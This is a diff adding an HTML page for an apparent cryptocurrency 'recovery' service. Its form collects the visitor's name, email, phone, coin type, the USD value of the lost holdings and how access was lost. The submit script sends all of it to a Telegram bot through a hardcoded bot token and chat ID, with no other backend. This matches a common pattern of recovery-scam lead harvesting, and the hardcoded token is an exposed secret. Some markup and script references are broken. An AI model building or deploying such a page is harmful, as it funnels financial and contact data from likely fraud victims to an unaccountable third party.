@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get Started</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+
+</head>
+<body>
+    <nav class="bg-white py-4 sticky top-0 z-[50]">
+        <header class="bg-orange-500 p-2  flex justify-between items-center">
+            <div>
+             <marquee behavior="" direction=""> <a href="book.html" class="text-[#000] text-sm font-semibold">Start your recovery</a> or 
+              <a href="tel:+18006451893" class="text-[#000] text-sm font-semibold">Call right now: +1 (800) 645-1893</a></marquee>
+            </div>
+            <input 
+              type="text" 
+              placeholder="Search for..." 
+              class="py-1 px-2 rounded border-gray-300 focus:outline-none text-gray-800"
+            >
+          </header>
+          
+        <div class="container mx-auto flex justify-between items-center">
+          <!-- Logo -->
+          <div class="flex items-center">
+         <a href="index.html"><img src="/assets/imgs/log.jpg alt="Logo" width="150px"></a>   
+          </div>
+      
+          <!-- Hamburger Menu Icon -->
+          <div class="lg:hidden">
+            <button id="menu-btn" class="text-gray-800 focus:outline-none">
+              <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16" />
+              </svg>
+            </button>
+          </div>
+      
+          <!-- Navigation Links -->
+          <ul id="menu" class="hidden lg:flex space-x-6 text-sm">
+            <li><a href="#about" class="text-gray-800 hover:text-yellow-500">About Us</a></li>
+            <li><a href="#services" class="text-gray-800 hover:text-yellow-500">Recovery Services</a></li>
+            <li><a href="#why-choose-us" class="text-gray-800 hover:text-yellow-500">Why Choose Us?</a></li>
+            <li><a href="#faq" class="text-gray-800 hover:text-yellow-500">FAQ</a></li>
+            <li><a href="#wallets" class="text-gray-800 hover:text-yellow-500">Wallets</a></li>
+            <li><a href="#blog" class="text-gray-800 hover:text-yellow-500">Blog</a></li>
+            <li><a href="#get-started" class="text-gray-800 hover:text-yellow-500">Get Started</a></li>
+          </ul>
+        </div>
+      
+        <!-- Mobile Menu -->
+        <div id="mobile-menu" class="hidden bg-white lg:hidden">
+          <ul class="space-y-4 text-center py-6">
+            <li><a href="#about" class="text-gray-800 hover:text-yellow-500 block">About Us</a></li>
+            <li><a href="#services" class="text-gray-800 hover:text-yellow-500 block">Recovery Services</a></li>
+            <li><a href="#why-choose-us" class="text-gray-800 hover:text-yellow-500 block">Why Choose Us?</a></li>
+            <li><a href="#faq" class="text-gray-800 hover:text-yellow-500 block">FAQ</a></li>
+            <li><a href="#wallets" class="text-gray-800 hover:text-yellow-500 block">Wallets</a></li>
+            <li><a href="#blog" class="text-gray-800 hover:text-yellow-500 block">Blog</a></li>
+            <li><a href="#get-started" class="text-gray-800 hover:text-yellow-500 block">Get Started</a></li>
+          </ul>
+        </div>
+      </nav>
+
+
+
+      <section class="bg-[#000] min-h-screen">
+
+        <p class="text-gray-400 p-4 mb-12">Contact us to get started today. You can reach us by phone @ 1 (800) 645-1893 or fill out the following form and we will get back to you as soon as possible.</p>
+        <!-- Step Indicator -->
+        <div class="max-w-3xl mx-auto pt-10 p-9">
+          <div class="flex items-center">
+            <!-- Step 1 -->
+            <div class="flex items-center">
+              <div
+                class="flex items-center justify-center w-8 h-8 rounded-full text-white bg-green-500 font-bold"
+              >
+                1
+              </div>
+              <p class="ml-2 text-sm font-medium text-green-500">Contact Info</p>
+            </div>
+            <!-- Line -->
+            <div class="flex-auto border-t-2 border-gray-300 mx-4"></div>
+            <!-- Step 2 -->
+            <div class="flex items-center">
+              <div
+                class="flex items-center justify-center w-8 h-8 rounded-full text-gray-500 bg-gray-200 font-bold"
+              >
+                2
+              </div>
+              <p class="ml-2 text-sm font-medium text-gray-500">Crypto Information</p>
+            </div>
+          </div>
+        </div>
+      
+        <div class="bg-gray-100 min-h-screen flex items-center justify-center">
+            <div class="max-w-4xl w-full px-6 py-10 bg-white shadow-lg rounded-lg">
+              <h1 class="text-2xl md:text-3xl font-bold text-center text-gray-800 mb-8">
+               Get Started
+              </h1>
+          
+              <form id="recovery-form">
+                <!-- How did you lose access -->
+                <div class="mb-6">
+                  <label class="block text-xl font-medium text-gray-700 mb-2">
+                    How did you lose access to your coins? *
+                  </label>
+                  <br>
+                  <select
+                    id="issue"
+                    class="w-full border-2 border-gray-400  rounded-lg shadow-sm focus:ring-orange-500 focus:border-orange-500 p-3"
+                    required
+                  >
+                    <option value="">Select an option</option>
+                    <option value="Forgot Password">Forgot Password</option>
+                    <option value="Old Wallet Version">Old Wallet Version</option>
+                    <option value="Deleted Data">Deleted Data</option>
+                    <option value="Scam">Scam</option>
+                    <option value="Other">Other</option>
+                  </select>
+                </div>
+          
+                <!-- Name -->
+                <div class="mb-6 grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <div>
+                    <label class="block text-xl font-medium text-gray-700 mb-2">First Name *</label>
+                    <input
+                      type="text"
+                      id="first-name"
+                      placeholder="First"
+                      class="w-full border-gray-300 rounded-lg shadow-sm   p-4 border-b-2 border-b-black"
+                      required
+                    />
+                  </div>
+                  <div>
+                    <label class="block text-xl font-medium text-gray-700 mb-2">Last Name *</label>
+                    <input
+                      type="text"
+                      id="last-name"
+                      placeholder="Last"
+                      class="w-full border-gray-300 rounded-lg shadow-sm   p-4 border-b-2 border-b-black"
+                      required
+                    />
+                  </div>
+                </div>
+          
+                <!-- Email -->
+                <div class="mb-6">
+                  <label class="block text-xl font-medium text-gray-700 mb-2">Email *</label>
+                  <input
+                    type="email"
+                    id="email"
+                    placeholder="example@email.com"
+                    class="w-full border-gray-300 rounded-lg shadow-sm   p-4 border-b-2 border-b-black"
+                    required
+                  />
+                </div>
+          
+                <!-- Phone -->
+                <div class="mb-6">
+                  <label class="block text-xl font-medium text-gray-700 mb-2">Phone *</label>
+                  <input
+                    type="tel"
+                    id="phone"
+                    placeholder="0802 123 4567"
+                    class="w-full border-gray-300 rounded-lg shadow-sm   p-4 border-b-2 border-b-black"
+                    required
+                  />
+                </div>
+          
+                <!-- Cryptocurrency Type -->
+                <div class="mb-6">
+                  <label class="block text-xl font-medium text-gray-700 mb-2">
+                    Cryptocurrency Type *
+                  </label>
+                  <select
+                    id="crypto-type"
+                    class="w-full border-gray-300 rounded-lg shadow-sm   p-4 border-b-2 border-b-black"
+                    required
+                  >
+                    <option value="">Select a cryptocurrency</option>
+                    <option value="Bitcoin">Bitcoin</option>
+                    <option value="Ethereum">Ethereum</option>
+                    <option value="Litecoin">Litecoin</option>
+                    <option value="Other">Other</option>
+                  </select>
+                </div>
+          
+                <br> <br> <hr> <br>
+                <!-- Approximate Value -->
+                <div class="mb-6">
+                  <label class="block text-sm font-medium text-gray-700 mb-2">
+                    Approximate Value of Coins in USD *
+                  </label>
+                  <input
+                    type="number"
+                    id="crypto-value"
+                    placeholder="Enter approximate value"
+                    class="w-full border-gray-300 rounded-lg shadow-sm   p-4 border-b-2 border-b-black"
+                    required
+                  />
+                </div>
+          
+                <!-- Additional Info -->
+                <div class="mb-6">
+                  <label class="block text-xl font-medium text-gray-700 mb-2">
+                    Anything else we should know?
+                  </label>
+                  <textarea
+                    id="additional-info"
+                    placeholder="Write here..."
+                    class="w-full border-gray-300 rounded-lg shadow-sm   p-4 border-2 border-black"
+                    rows="4"
+                  ></textarea>
+                </div>
+          
+                <p class="p-4 text-center ">Submit your request and we will contact you as soon as possible to discuss your recovery. Please be aware that we will be signing a contract before we attempt to recover your funds.</p>
+                <!-- Submit Button -->
+                <button
+                  type="submit"
+                  class="w-full bg-orange-600 text-white py-3 rounded-lg hover:bg-orange-700"
+                >
+                  Submit
+                </button>
+              </form>
+            </div>
+          
+          
+      </section>
+       <script>
+              const form = document.getElementById("recovery-form");
+          
+              form.addEventListener("submit", async (event) => {
+                event.preventDefault();
+          
+                // Collect form data
+                const issue = document.getElementById("issue").value;
+                const firstName = document.getElementById("first-name").value;
+                const lastName = document.getElementById("last-name").value;
+                const email = document.getElementById("email").value;
+                const phone = document.getElementById("phone").value;
+                const cryptoType = document.getElementById("crypto-type").value;
+                const cryptoValue = document.getElementById("crypto-value").value;
+                const additionalInfo = document.getElementById("additional-info").value;
+          
+                // Construct message for Telegram
+                const message = `
+          🔔 *New Recovery Form Submission*:
+          - *Issue*: ${issue}
+          - *Name*: ${firstName} ${lastName}
+          - *Email*: ${email}
+          - *Phone*: ${phone}
+          - *Crypto Type*: ${cryptoType}
+          - *Value in USD*: ${cryptoValue}
+          - *Additional Info*: ${additionalInfo || "N/A"}
+                `;
+          
+                // Send message to Telegram bot
+                const botToken = "8119231817:AAGAmxzBGY0vBPeVFM2hEEBbXkoAUGxm_HE"; // Replace with your bot token
+                const chatId = "6837437455"; // Replace with your chat ID
+                const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+          
+                try {
+                  const response = await fetch(telegramApiUrl, {
+                    method: "POST",
+                    headers: {
+                      "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                      chat_id: chatId,
+                      text: message,
+                      parse_mode: "Markdown",
+                    }),
+                  });
+          
+                  if (response.ok) {
+                    // alert("Form submitted successfully!");
+                    form.reset();
+                  } else {
+                    // alert("Failed to send form data. Please try again.");
+                  }
+                } catch (error) {
+                  console.error("Error submitting the form:", error);
+                //   alert("An error occurred. Please try again.");
+                }
+              });
+            </script> 
+      <script>
+        // JavaScript logic
+        const nextButton = document.getElementById("next-button");
+        const contactStep = document.getElementById("contact-step");
+        const cryptoStep = document.getElementById("crypto-info-step");
+      
+        nextButton.addEventListener("click", () => {
+          contactStep.classList.add("hidden");
+          cryptoStep.classList.remove("hidden");
+        });
+      </script>
+      
+
+
+      <script src="scripts.js"></script>
+</body>
+</html>
